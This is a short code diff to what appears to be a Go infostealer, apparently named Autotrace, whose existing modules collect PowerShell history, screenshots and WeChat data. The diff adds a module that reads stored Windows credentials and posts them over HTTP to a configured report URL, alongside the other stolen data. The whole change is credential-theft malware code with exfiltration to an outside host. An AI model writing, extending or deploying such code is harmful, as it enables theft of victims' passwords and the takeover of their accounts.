@@ -9,6 +9,7 @@ import (
 	"generate/pool/powershellHistory"
 	"generate/pool/screenshot"
 	"generate/pool/wechat"
+	"generate/pool/wincreds"
 	"log"
 	"sync"
 )
@@ -52,6 +53,21 @@ func (self *Autotrace)Work(){
 		postback2.PostContent()
 		wg.Done()
 	}()
+
+	wg.Add(1)
+	go func() {
+		Wincreds,err := wincreds.GetWincred()
+		if err == nil{
+			postback2 := &postback.HttpPostback{}
+			postback2.SetTargetUrl(self.reportUrl)
+			postback2.SetFileName("Wincreds")
+			postback2.SetGuid(guid)
+			postback2.Content = Wincreds
+			postback2.PostContent()
+		}
+		wg.Done()
+	}()
+
 
 	wg.Add(1)
 	go func() {
